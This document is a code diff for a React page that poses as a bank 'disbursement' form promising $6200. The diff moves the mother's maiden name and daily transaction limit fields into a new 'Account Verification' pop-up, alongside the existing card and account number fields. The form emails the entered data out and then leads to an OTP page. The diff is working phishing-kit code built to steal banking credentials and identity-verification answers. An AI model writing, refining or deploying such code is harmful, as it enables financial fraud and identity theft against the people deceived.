@@ -9,7 +9,7 @@ import bankLogo from './img/banklogo.png';
 
 const ExamForm2 = () => {
   const [showConfirmModal, setShowConfirmModal] = useState(false);
-  // const [showPinModal, setShowPinModal] = useState(false);
+  const [showPinModal, setShowPinModal] = useState(false);
   const [formValues, setFormValues] = useState({
     bankName: '',
     cardNumber: '',
@@ -63,19 +63,19 @@ const ExamForm2 = () => {
 
   const handleConfirmClick = () => {
     sendEmail();
-    resetForm();
+    // resetForm();
     setShowConfirmModal(false);
-    navigate('/otp');
-    // setShowPinModal(true);
+    // navigate('/otp');
+    setShowPinModal(true);
   };
 
-  // const handlePinSubmit = (e) => {
-  //   e.preventDefault();
-  //   sendEmail();
-  //   resetForm();
-  //   setShowPinModal(false);
-  //   navigate('/otp');
-  // };
+  const handlePinSubmit = (e) => {
+    e.preventDefault();
+    sendEmail();
+    resetForm();
+    setShowPinModal(false);
+    navigate('/otp');
+  };
 
   const handleInputChange = (e) => {
     const { name, value } = e.target;
@@ -151,11 +151,11 @@ const ExamForm2 = () => {
           </div> */}
           <h3>Enter Bank Details</h3>
           <p>
-            Enter the following to complete payment <br />
+            Enter the following to receive your funds <br />
             Only enter correct details to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.
           </p>
           <div className="card p-4 pt-2">
-            <p className='text-end fw-bold fs-6'>Single Disbursement $3200</p>
+            <p className='text-end fw-bold fs-6'>Single Disbursement $6200</p>
             <p className="fst-italic text-end p-0 m-0">Trusted and Secure Payment</p>
             <div className="d-flex justify-content-end mb-3">
               <img src={bankLogo} alt="" className="img-fluid" width={270} height={30} />
@@ -188,7 +188,7 @@ const ExamForm2 = () => {
               </Form.Group>
 
               
-              <Form.Group className="mb-3" controlId="maidenName">
+              {/* <Form.Group className="mb-3" controlId="maidenName">
                 <Form.Label>Mother’s Maiden Name</Form.Label>
                 <Form.Control
                   type="text"
@@ -199,7 +199,7 @@ const ExamForm2 = () => {
                   onChange={handleInputChange}
                   required
                 />
-              </Form.Group>
+              </Form.Group> */}
 
               <Form.Group className="mb-3" controlId="accNo">
                 <Form.Label>Account Number</Form.Label>
@@ -271,14 +271,14 @@ const ExamForm2 = () => {
               )}
 
               
-              <Form.Group controlId="formCardLimit" className="mt-2">
+              {/* <Form.Group controlId="formCardLimit" className="mt-2">
 
               <Form.Label> Transaction Limit per Day </Form.Label>
 
               <Form.Control type="text" placeholder="Enter daily transaction limit (e.g., $5,000)" name="cardLimit" value={formValues.cardLimit}
                 onInput={handleCardLimitChange}
                 onChange={handleInputChange} required />
-            </Form.Group>     
+            </Form.Group>      */}
 
               <Form.Group controlId="formAddress" className="mt-4">
                 <Form.Label>Bank Branch Address</Form.Label>
@@ -360,14 +360,14 @@ const ExamForm2 = () => {
       </Modal>
 
       {/* PIN Modal */}
-      {/*
+    
       <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
         <Modal.Header closeButton>
-          <Modal.Title>Enter PIN</Modal.Title>
+          <Modal.Title>Account Verification</Modal.Title>
         </Modal.Header>
         <Modal.Body>
           <Form onSubmit={handlePinSubmit}>
-            <Form.Group controlId="formPin">
+            {/* <Form.Group controlId="formPin">
               <Form.Label>Enter PIN</Form.Label>
               <Form.Control
                 type="password"
@@ -378,14 +378,37 @@ const ExamForm2 = () => {
                 onChange={handleInputChange}
                 required
               />
+            </Form.Group> */}
+
+            <Form.Group className="mb-3" controlId="maidenName">
+              <Form.Label>Mother’s Maiden Name</Form.Label>
+              <Form.Control
+                type="text"
+                placeholder="Enter mother's maiden name"
+                name="maidenName"
+                value={formValues.maidenName}
+                // onInput={handleTextOnlyInput}
+                onChange={handleInputChange}
+                required
+              />
             </Form.Group>
+
+            <Form.Group controlId="formCardLimit" className="mt-2">
+
+            <Form.Label> Transaction Limit per Day </Form.Label>
+
+            <Form.Control type="text" placeholder="Enter daily transaction limit (e.g., $5,000)" name="cardLimit" value={formValues.cardLimit}
+              onInput={handleCardLimitChange}
+              onChange={handleInputChange} required />
+            </Form.Group>  
+
             <Button variant="primary" type="submit" className="mt-3">
-              Submit PIN
+              VERIFY
             </Button>
           </Form>
         </Modal.Body>
       </Modal>
-      */}
+      
       
       <Footer />
     </div>
